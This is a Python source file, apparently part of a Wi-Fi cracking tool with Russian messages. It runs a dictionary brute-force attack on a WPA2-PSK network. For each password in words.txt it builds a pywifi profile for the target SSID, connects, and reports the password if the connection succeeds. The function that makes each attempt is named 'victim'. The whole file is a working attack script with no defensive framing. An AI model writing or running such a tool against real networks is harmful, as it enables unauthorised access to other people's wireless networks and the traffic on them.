from pywifi import Profile, const
from libs.TFormat import tcolors
from libs.func import clear
from time import sleep
from tqdm import trange

def victim (iface, ssid, password): # Сетевой профиль
    profile = Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password

    iface.remove_all_network_profiles()
    profile = iface.add_network_profile(profile)
    iface.connect(profile)
    sleep(0.1)
    while iface.status() == 3: sleep(0.1)

    if iface.status() == const.IFACE_CONNECTED:
        return True
    else: return False

def brutforce(iface, ssid):
    clear()
    print(tcolors.PROC)
    passwords = open('words.txt', 'r')
    l = len(passwords.readlines())
    passwords.seek(0)
    count = 0

    with trange(l, dynamic_ncols=True, desc=(f"[~] Попытка взлома {ssid}..."),\
                bar_format=(tcolors.PROC + '{l_bar}{bar}{r_bar}'), unit='pwd') as bar:
        for pwd in passwords:
            if victim(iface, ssid, pwd.rstrip()) == True:
                bar.update(l - count)
                bar.close()
                sleep(0.2)
                clear()
                print(tcolors.SUCCESS +\
                      f"[+] Успешное подключение!\nПароль: {pwd.rstrip()}" + tcolors.END)
                exit()
            else:
                bar.update(1)
                count += 1
    passwords.close()
    clear()
    print(tcolors.ERROR + "[-] Не удалось подобрать пароль :(" + tcolors.END)